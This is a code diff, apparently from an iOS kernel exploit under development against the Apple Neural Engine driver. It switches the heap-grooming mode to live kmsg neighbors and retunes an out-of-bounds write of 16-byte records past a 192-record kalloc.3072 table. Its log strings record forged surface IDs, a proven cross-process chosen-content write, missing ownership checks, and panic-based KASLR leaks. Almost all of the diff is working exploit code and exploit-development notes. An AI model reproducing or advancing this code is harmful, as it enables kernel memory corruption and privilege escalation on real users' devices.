@@ -158,7 +158,7 @@
 #import <math.h>
 #import <objc/message.h>
 
-#define P044_BUILD @"p044-v69-inflight"
+#define P044_BUILD @"p044-v70-1rec-oob"
 
 #define INPUT_COUNT 191
 #define PAYLOAD_SIZE 0xb80
@@ -238,7 +238,7 @@ static BOOL p044_model_is_addchain(void) {
 #define ANE_REQ_OFF_OUT_IDS 0x52cu
 #define ANE_REQ_OFF_EVENTS 0x930u
 #define ANE_TOTIN 191u
-#define P044_HOLE_MODE 1 /* 1 = freed-hole lane + reclaim read-back; 0 = live-kmsg lane; 2 = contiguous-run frees (DEAD per 101ae: modified-after-free panic or kernel zeroing — do not re-enable) */
+#define P044_HOLE_MODE 0 /* v70: live-kmsg neighbor for 1-record OOB (REQ_IN=192 → 193 records). 1 = freed-hole (CLOSED); 2 = contiguous-run (DEAD per 101ae) */
 #define P044_HOLE_RUN_LO 1024u /* v48.2: free pairs [LO..HI) hole+victim — adjacent elements */
 #define P044_HOLE_RUN_HI 1536u
 #define P044_RECLAIM_SURF 8u
@@ -951,13 +951,10 @@ static void p044_stage_surfaces(uint32_t *sidsOut, uint32_t maxOut,
    (run#1: fresh conn -> sel0 kr=0x5, sel2 0xe00002c2). */
 
 #define P044_REQ_IN 191u
-/* v58 REQ_IN sweep scaffold (note 130 Phase K1): default 191 (v61 B1:
-   count=192 = exactly in-bounds, note 149). Before build,
-   PHASE 3 reads Documents/p044_req_in.txt if present — a single "N" line —
-   and overrides P044_REQ_IN at runtime. Sweep protocol: one fire per
-   force-quit, N = 193, 196, 200, 224, 255; (N-192) = records written OOB
-   past kalloc.3072. Find max N that completes without panic; the fill-spill
-   scan already reports the OOB records. */
+/* v58/v70 REQ_IN is INPUT count. Table records = N + 1 output.
+   N=191 → 192 records = in-bounds (B1). N=192 → 193 records = 1-record OOB
+   at neighbor+0 (note 149 candidate 2 / note 175). Documents/p044_req_in.txt
+   overrides N for one tap (consumed). Do not treat N as the table count. */
 static uint32_t p044ReqInOverride;
 static uint32_t p044_req_in(void) { return p044ReqInOverride ? p044ReqInOverride : P044_REQ_IN; }
 /* v56: 602112 -> 0x4000. Note 127 proved CheckandPrewire marshals into a FIXED
@@ -2043,14 +2040,14 @@ static void *watch_worker(void *arg) {
     [out appendString:@"v54 qos2: single variable — compile+load qos 0x15→2 (PoC parity). Three taps: status=0x2 statusType=0x9 IDENTICAL to v53 → qos CLOSED. Foreign sid spilled in out-entry n=4 (167/171/170), ARMED lane, validate=1, no panic; runs 2+3 shared programHandle 0x6c241723 (same boot, cache-key deterministic). v55 = full PoC transport: MIL bundle (model/ dir), key XVRC27/mach_msg_min/model.anehash, cacheID nil, MIL opts dict. v55a = PoC-parity resolver (flat bundle-root candidate) + explicitFolders so model/ ships as a dir.\n"];
     [out appendString:@"v56 smallgeo+lane+stillness (notes 126/127): panic pack proved CheckandPrewire marshals into a FIXED 192-record kalloc.3072 object — 255-entry requests spill records 192+ ([sid][flag][1][1], flag 0xc0..0xfe sequential); the Oct-6 20:28 abort was entry #193 str'ing past a page-terminating element (x25+0xC00==far), and 3 MAF panics dumped the same record stream in kalloc.3072/1536/32. So 0xe00002c2 = kIOReturnBadArgument is the arg check, not budget. v56: REQ_IN_BYTES 602112→0x4000 (size-validation vs arg-check test), MIL handle==0 retries the mlmodelc URL + v54 transport so the direct lane arms, and the census target is stillness-checked (1.2 s re-diff — movers are own CoreML/Siri staging, the 6f false positive). Sid-band re-read: census 'foreign' band = OUR OWN staging surfaces; output-sid lane story closed.\n"];
     [out appendString:@"v57 sidreval (note 129 risk + 130 plan): staged sids 161..878 overlap the census band 162–610, and the out target is picked PRE-CREATION — if the picked surface dies before the build, a NEW surface (ours or system) inherits its sid and the lane silently writes OUR memory. v57 re-validates the lane AFTER all surfaces are created: resolved object must not CFEqual any of our staged surfaces, size must still be 0x4000, and the pre-fire snapshot + useCount are re-taken at arm time so the pre/post diff measures only the fire. Look for [v57] OUTPUT-SID LANE ARMED (clean) vs [v57] SID ALIAS (dropped — census target was recycled). Also next run: capture the KERNEL log during the fire — 'MemoryMapRequest for 255 buffers, result: 0xe00002c2' printing for OUR request decides marshaling-count vs sid-validation as the 0x2/0x9 reject (note 130).\n"];
-    [out appendString:@"v58 sweep scaffold (note 130 Phase K1): write N to /var/mobile/Documents/p044_req_in.txt (one line) before tapping P044 — this tap fires with N inputs instead of 254 and the file is consumed (one file = one deliberate fire, no persistence across force-quits). Sweep protocol: N = 193, 196, 200, 224, 255; (N-192) = records CheckandPrewire writes PAST kalloc.3072. Goal: max N that completes without panic + kernel-log capture each run. With N != 254 the out-entry moves off symbolIndex 254 / body+0x444 — the pattern scan ({outSid,0,1,2}) still finds it.\n"];
+    [out appendString:@"v58/v70 REQ_IN: Documents/p044_req_in.txt is INPUT count N (consumed). Table records = N+1 output. N=191 in-bounds; N=192 = 1-record OOB at neighbor+0; N=193 = 2-record OOB. Do not use (N-192) as spill — that ignored the output record (note 175).\n"];
     [out appendString:@"v62 closed-loop scaffold (note 161 follow-up): three new app-Documents files, ALL consumed on read — (1) p044_target.txt = decimal IOSurfaceGetID of the surface that receives the ANE output (LC-guest loop: guest writes its own GetID here); (2) p044_fill.txt = hex u16 fp16 tile (e.g. 4141) — every A input is tile-filled so the min model's output = exactly this u16 at the target base (CHOSEN content); (3) forensics sidecars now written automatically: p044_census_<sid>.bin (full 16384 B of each 0x4000 foreign hit, cap 12) + p044_target_pre.bin (file-target pre-fire full dump). New round-trip diagnostics: [for] lines now log rt=GetID(lookup(arg)) — the 128-fire 310→312535552 anomaly gets settled this tap; if the file target's round-trip is broken the lane DROPS (no honest aim). GUEST-LOOP PROTOCOL (single binary, two installs): GUEST install — push p044_guest.txt to ITS Documents, tap once = GUEST HOLD (surface tiled 0x4B1D created + held; sid in log; keep app background-alive); pull that sid, push as p044_target.txt into the STANDALONE app along with p044_fill.txt=<different tile e.g. 5eaf> + p044_req_in.txt=127 + p044_model.txt=<min model>, tap standalone = the fire; STANDALONE evidence: p044_target_pre.bin must show the guest's magic tile at that sid (round-trip gate must pass); GUEST observe — tap the guest again with p044_guest.txt: p044_guest_after.bin + base u16 != pre-tile at base with rest still uniform = CROSS-PROCESS CHOSEN-CONTENT WRITE proven.\n"];
     [out appendString:@"v63 copyout chosen-write (note 163 ladder #2): bundled XVRC27_127in_copyout — output[i] = input_i's fp16 tile VERBATIM (127 identity ops -> concat, spec-7 fp16 output). Set Documents/p044_model.txt=XVRC27_127in_copyout + p044_req_in.txt=127 + p044_target.txt=<sid>, and p044_fill.txt as a COMMA LIST of up to 127 hex u16 tiles (e.g. 4141,4242,4343,...) => the ANE DMAs the chosen pattern (up to 254 B, tiled to 512 B) into the target surface base. Single fill value => uniform 512 B. This is the chosen-content MULTI-BYTE write the consumer's cold-path (no ownership check, note 163) delivers into any resolvable sid. RE proof: prewire 0x874c070 marshals [sid][flag][1][1] w/o bounds check (>192 = 43748 OOB); consumer 0x874c7f4 gates >128 records + plane count/size/circularBuffer, cold-path IOSurface lookup 0x9867f18 has NO per-request ownership check — gated only by the systemwide global-insecure-lookup flag.\n"];
     [out appendString:@"v60 passthrough (Oct-12 20:23): XVRC27_254in_passthrough — same fire, same OUTPUT-SID lane, same census/stillness/out-entry scan; ONLY the model changes (addchain -> passthrough). The 23F77 reject (status=0x2 statusType=0x9 Program Inference error) + the rig's pred=FAILED (accepted, only the 2-byte 0x6a58 header landed) are split by this run: program-complexity cause -> ACCEPTED here (fill + foreign write in ONE fire on 23F77); input-count cause -> rejected again (next vehicle = B model 127in + 1out = 128 records, NO overflow, inference proven to complete on 23F77 y=613 — the foreign OUTPUT sid rides the in-bounds OUTPUT record through the size/symbol gates). Oracles: foreign full-surface pre/post diff + useCount + OUR input fill pattern (0x41..0x50 words) in the foreign surface = OUR content in THEIR memory + sidecar p044_outdump.bin.\n"];
     [out appendString:@"v49 outcome (09:41): BAR HALF ONE PASSED - 62 forged sids {870..931, 0xc0..0xfd} received back from a LIVE port-kind victim at body+0x64..0x434 = exactly the tile end. Fill starts at victim body+0x64; desc-region forge (copyout reject) is the same landing 0x48 earlier. Field-window math (note 118 s3): type==0 never forms from {sid,0xcN,1,1}; desc conversion needs a different record pattern - the consume path is the door.\n"];
     [out appendString:@"Oct-2 panic pack: record area = dedicated kalloc.3072 (192x16); GZAlloc guard abort (pc=+0x18C store) and modified-after-free are the two freed-lane failure modes. Hole lane CLOSED.\n"];
     [out appendString:@"Run#1 proof: raw IOConnect conn CLOSED (handle binds to sharedConnection; sel0 kr=0x5, sel2 0xe00002c2).\n"];
-    [out appendString:@"Landing lane per build: HOLE_MODE=1 freed hole + reclaim read-back; 0 = live-kmsg neighbor.\n"];
+    [out appendString:@"Landing lane per build: HOLE_MODE=0 live-kmsg neighbor (v70 1-record OOB). Hole punch CLOSED.\n"];
     [out appendString:@"Occupancy HIT is a 3072 store of ANE records. NOT conversion. NOT hasKread.\n"];
     [out appendString:@"record_forge: forge_seen>0 = spilled body carries client-chosen sids (bar half one).\n\n"];
 
@@ -2769,10 +2766,21 @@ static void *watch_worker(void *arg) {
 
     // 6. FIRE — v48.1 G1/G2: _ANEClient doEvaluateDirectWithModel, ids[] = OUR request surfaces
     [out appendFormat:@"\n=== PHASE 5: FIRE — _ANEClient doEvaluateDirectWithModel (%u request surfaces) ===\n", p044_req_in()];
-    [out appendFormat:@">>> ids[] = OUR staged surface sids, indices 0..%u -> records [our sid][k][1][1]; count=%u = exactly in-bounds vs the 192-record kalloc.3072 table (B1: NO spill expected) <<<\n",
-        p044_req_in() - 1, p044_req_in()];
-    [out appendString:@">>> CheckandPrewire: capacity 192, NO bound check, 16B stride INLINE in kalloc.3072 <<<\n"];
-    [out appendString:@">>> B1 in-bounds: panic NOT expected — if it panics anyway, the ips IS evidence (KASLR included) <<<\n\n"];
+    {
+        uint32_t nIn = p044_req_in();
+        uint32_t nRec = nIn + 1u; /* +1 output; CheckandPrewire concatenates */
+        uint32_t spill = (nRec > 192u) ? (nRec - 192u) : 0u;
+        [out appendFormat:@">>> ids[] = OUR staged sids, inputs 0..%u + 1 output -> %u records vs capacity 192; OOB records=%u (16B each at table+0xC00) <<<\n",
+            nIn ? nIn - 1u : 0u, nRec, spill];
+        [out appendString:@">>> CheckandPrewire: capacity 192, NO bound check, 16B stride INLINE in kalloc.3072 <<<\n"];
+        if (spill == 0) {
+            [out appendString:@">>> in-bounds (N+1 <= 192): panic NOT expected — if it panics anyway, the ips IS evidence <<<\n\n"];
+        } else if (spill == 1) {
+            [out appendString:@">>> 1-record OOB (N=192): first 16B at neighbor+0. Panic at 0x874c1fc = unmapped next page. Mapped neighbor = silent 16B store. HOLE_MODE=0 keeps kmsgs LIVE. <<<\n\n"];
+        } else {
+            [out appendFormat:@">>> %u-record OOB: spill starts at table+0xC00. Panic possible. <<<\n\n", spill];
+        }
+    }
     p044_write_log(out);
 
     NSString *fireMode = @"not-attempted";
